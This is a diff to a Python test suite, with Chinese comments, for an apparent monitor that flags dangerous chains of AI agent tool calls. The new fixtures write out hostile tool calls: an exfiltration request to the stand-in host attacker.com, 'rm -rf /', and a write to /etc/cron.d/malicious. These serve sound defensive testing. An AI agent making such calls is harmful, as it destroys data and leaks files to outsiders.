@@ -83,28 +83,38 @@ class TestIntegration:
         # 攻击会话应该有告警
         assert len(all_alerts) > 0, "攻击会话应该有告警"
         
-        # 应该有 DANGEROUS_CHAIN 类型的告警
-        chain_alerts = [a for a in all_alerts if a.alert_type == "DANGEROUS_CHAIN"]
-        assert len(chain_alerts) > 0, "应该有 DANGEROUS_CHAIN 告警"
+        # 应该有 CAPABILITY_CHAIN 类型的告警
+        chain_alerts = [a for a in all_alerts if a.alert_type == "CAPABILITY_CHAIN"]
+        assert len(chain_alerts) > 0, "应该有 CAPABILITY_CHAIN 告警"
     
-    def test_dangerous_chain_patterns(self, detector):
-        """测试危险链模式检测"""
-        # 测试几个典型的危险链模式
+    def test_capability_chain_patterns(self, detector):
+        """测试能力链模式检测"""
+        # 测试几个典型的能力链模式
         test_cases = [
             {
                 "name": "data_exfiltration",
-                "tools": ["read_file", "http_request"],
-                "expected_alert": "DANGEROUS_CHAIN"
+                "tools": [
+                    ("read_file", {"path": "/data/file.txt"}),
+                    ("http_request", {"url": "https://attacker.com/exfiltrate"})
+                ],
+                "expected_alert": "CAPABILITY_CHAIN"
             },
             {
                 "name": "sql_to_rce",
-                "tools": ["execute_sql", "shell"],
-                "expected_alert": "DANGEROUS_CHAIN"
+                "tools": [
+                    ("execute_sql", {"query": "SELECT * FROM users"}),
+                    ("shell", {"command": "rm -rf /"})
+                ],
+                "expected_alert": "CAPABILITY_CHAIN"
             },
             {
                 "name": "privilege_escalation",
-                "tools": ["read_file", "write_file", "shell"],
-                "expected_alert": "DANGEROUS_CHAIN"
+                "tools": [
+                    ("read_file", {"path": "/data/file.txt"}),
+                    ("write_file", {"path": "/etc/cron.d/malicious"}),
+                    ("shell", {"command": "rm -rf /"})
+                ],
+                "expected_alert": "CAPABILITY_CHAIN"
             }
         ]
         
@@ -113,10 +123,10 @@ class TestIntegration:
             detector = RealTimeDetector(rules_dir="src/rules")
             
             alerts = []
-            for i, tool_name in enumerate(case["tools"]):
+            for i, (tool_name, arguments) in enumerate(case["tools"]):
                 tool_call = ToolCallInput(
                     tool_name=tool_name,
-                    arguments={},
+                    arguments=arguments,
                     timestamp=datetime.now(),
                     session_id=f"test_{case['name']}",
                     agent_name="test"
@@ -178,14 +188,14 @@ class TestIntegration:
         frequency_alerts = [a for a in alerts if a.alert_type == "FREQUENCY_ANOMALY"]
         assert len(frequency_alerts) > 0, "应该检测到频率异常"
     
-    def test_param_whitelist_compliant(self, detector):
-        """测试参数白名单合规"""
-        # http_request 使用白名单内的 URL
+    def test_param_grading_low_risk(self, detector):
+        """测试参数定级：低风险参数"""
+        # http_request 使用白名单内 URL
         tool_call = ToolCallInput(
             tool_name="read_file",
             arguments={"path": "/data/file.txt"},
             timestamp=datetime.now(),
-            session_id="test_whitelist",
+            session_id="test_grading",
             agent_name="test"
         )
         detector.on_tool_call(tool_call)
@@ -194,25 +204,23 @@ class TestIntegration:
             tool_name="http_request",
             arguments={"url": "https://internal-api.com/data"},
             timestamp=datetime.now(),
-            session_id="test_whitelist",
+            session_id="test_grading",
             agent_name="test"
         )
         alerts = detector.on_tool_call(tool_call)
         
-        # 如果参数合规，不应该有 DANGEROUS_CHAIN 告警
-        chain_alerts = [a for a in alerts if a.alert_type == "DANGEROUS_CHAIN"]
-        # 可能没有告警，或者告警被跳过
+        # 白名单 URL 参数定级为 medium，链模式可能跳过
         # 检查是否有跳过的警告
         assert len(detector.skipped_chain_warnings) >= 0
     
-    def test_param_whitelist_non_compliant(self, detector):
-        """测试参数白名单不合规"""
+    def test_param_grading_high_risk(self, detector):
+        """测试参数定级：高风险参数"""
         # read_file -> http_request(外部URL)
         tool_call = ToolCallInput(
             tool_name="read_file",
             arguments={"path": "/data/file.txt"},
             timestamp=datetime.now(),
-            session_id="test_whitelist_bad",
+            session_id="test_grading_bad",
             agent_name="test"
         )
         detector.on_tool_call(tool_call)
@@ -221,14 +229,14 @@ class TestIntegration:
             tool_name="http_request",
             arguments={"url": "https://attacker.com/exfiltrate"},
             timestamp=datetime.now(),
-            session_id="test_whitelist_bad",
+            session_id="test_grading_bad",
             agent_name="test"
         )
         alerts = detector.on_tool_call(tool_call)
         
-        # 应该有 DANGEROUS_CHAIN 告警
-        chain_alerts = [a for a in alerts if a.alert_type == "DANGEROUS_CHAIN"]
-        assert len(chain_alerts) > 0, "参数不合规时应该有 DANGEROUS_CHAIN 告警"
+        # 应该有 CAPABILITY_CHAIN 告警（外部 URL 参数定级为 critical）
+        chain_alerts = [a for a in alerts if a.alert_type == "CAPABILITY_CHAIN"]
+        assert len(chain_alerts) > 0, "参数高风险时应该有 CAPABILITY_CHAIN 告警"
     
     def test_multiple_sessions(self, detector):
         """测试多会话隔离"""
